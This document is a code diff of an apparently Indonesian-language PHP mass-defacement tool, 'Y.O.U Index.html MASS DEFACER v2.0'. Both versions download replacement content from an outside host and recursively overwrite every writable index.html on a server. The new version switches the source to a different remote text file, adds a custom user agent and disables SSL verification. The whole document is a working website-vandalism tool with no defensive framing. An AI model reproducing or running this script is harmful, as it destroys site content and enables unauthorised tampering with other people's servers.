@@ -1,54 +1,55 @@
 <?php
 /**
- * Y.O.U - Automated Index.html Defacer
- * Memakan semua index.html di server dan menggantinya dengan konten dari URL.
- * HANYA INDEX.HTML (case sensitive).
+ * Y.O.U - Index.html MASS DEFACER v2.0
+ * Overwrite SEMUA index.html di server dengan konten dari URL.
+ * CASE SENSITIVE: cuma index.html (huruf kecil semua)
  */
 
-// Konfigurasi
-$target_url = 'https://raw.githubusercontent.com/hamz666-lang/fuckhaters/main/index.html';
-$start_path = __DIR__; // Mulai dari direktori script ini berada
+// Target konten pengganti
+$source = 'https://perfexsaasmodule.com/memek.txt';
+$root = __DIR__;
 
-// Fungsi untuk mendownload konten dari URL
-function fetch_content($url) {
+// Ambil payload
+function get_payload($url) {
     $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    $data = curl_exec($ch);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 25,
+        CURLOPT_USERAGENT => 'Y.O.U-Defacer/1.0'
+    ]);
+    $out = curl_exec($ch);
+    $err = curl_error($ch);
     curl_close($ch);
-    return $data;
+    if ($err) die("[!] cURL error: $err\n");
+    return $out;
 }
 
-// Fungsi rekursif untuk mencari dan mengganti index.html
-function deface_index_html($dir, $payload) {
-    $files = scandir($dir);
-    foreach ($files as $file) {
-        if ($file == '.' || $file == '..') continue;
-        $path = $dir . DIRECTORY_SEPARATOR . $file;
-        if (is_dir($path)) {
-            // Rekursif ke subdirektori
-            deface_index_html($path, $payload);
-        } elseif (strtolower($file) === 'index.html') {
-            // HANYA index.html yang di-overwrite
-            if (is_writable($path)) {
-                file_put_contents($path, $payload);
-                echo "[+] Berhasil: $path\n";
+// Walker rekursif
+function walk($dir, $payload) {
+    $items = scandir($dir);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $full = $dir . DIRECTORY_SEPARATOR . $item;
+        if (is_dir($full)) {
+            walk($full, $payload);
+        } elseif ($item === 'index.html') {
+            if (is_writable($full)) {
+                file_put_contents($full, $payload);
+                echo "[✔] DEFACED: $full\n";
             } else {
-                echo "[-] Gagal (tidak writable): $path\n";
+                echo "[✘] SKIP (read-only): $full\n";
             }
         }
     }
 }
 
-// Eksekusi
-$payload = fetch_content($target_url);
-if ($payload === false) {
-    die("[!] Gagal mendownload payload dari $target_url\n");
-}
+// GO
+$payload = get_payload($source);
+if (!$payload) die("[!] Gagal ambil payload.\n");
 
-echo "[*] Mulai deface index.html dari: $start_path\n";
-deface_index_html($start_path, $payload);
-echo "[*] Selesai.\n";
+echo "[*] Root: $root\n";
+walk($root, $payload);
+echo "[✓] Misi selesai, semua index.html udah diganti.\n";
 ?>
